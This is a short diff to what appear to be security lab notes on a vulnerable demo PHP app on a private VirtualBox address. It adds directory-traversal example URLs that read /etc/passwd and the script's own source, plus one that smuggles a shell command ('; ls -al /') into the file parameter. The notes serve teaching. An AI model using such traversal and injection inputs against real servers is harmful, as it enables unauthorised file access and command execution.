@@ -66,8 +66,9 @@ root> tcpdump -A -vvv -i vboxnet1 host 192.168.33.10
   * selinux (setenforce 0, setenforce 1)
 * Directory traversal
   * for this reason: http://192.168.33.10/zcu/list/fancy_script.php
-  * but can be misused: http://192.168.33.10/zcu/list/get_file.php?file=../index.php
-  * or even worst: http://192.168.33.10/zcu/list/get_file.php?file=../../../../etc/passwd
+  * but can be misused: http://192.168.33.10/zcu/list/get_file.php?file=../../../../etc/passwd
+  * or: http://192.168.33.10/zcu/list/get_file.php?file=get_file.php
+  * or even worst: http://192.168.33.10/zcu/list/get_file.php?file=/proc/1/cmdline;%20ls%20-al%20/
 
 
 ## Where to go next
